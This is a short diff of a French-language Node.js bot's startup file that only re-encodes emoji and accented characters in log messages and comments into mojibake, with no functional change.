   console.log(`[QR] Page QR Code: http://localhost:${port}/qr`);
-  console.log(`[PREMIUM] 💎 Dashboard Premium: http://localhost:${port}/premium`);
-  console.log(`[PREMIUM] 👑 Admin: http://localhost:${port}/premium/admin.html`);
+  console.log(`[PREMIUM] ðŸ’Ž Dashboard Premium: http://localhost:${port}/premium`);
+  console.log(`[PREMIUM] ðŸ‘‘ Admin: http://localhost:${port}/premium/admin.html`);
 });
 
-// ═══════════════════════════════════════════════════════════
-// 🚀 LANCEMENT
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸš€ LANCEMENT
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 startBot().catch((err) => {
-  console.error("❌ Erreur de démarrage:", err.message);
+  console.error("âŒ Erreur de dÃ©marrage:", err.message);
 });
 
 process.on("uncaughtException", (err) => {
-  console.log("⚠️ Erreur:", err.message);
+  console.log("âš ï¸ Erreur:", err.message);
 });
 
 process.on("unhandledRejection", (err) => {
-  console.log("⚠️ Rejet:", err.message);
+  console.log("âš ï¸ Rejet:", err.message);
 });
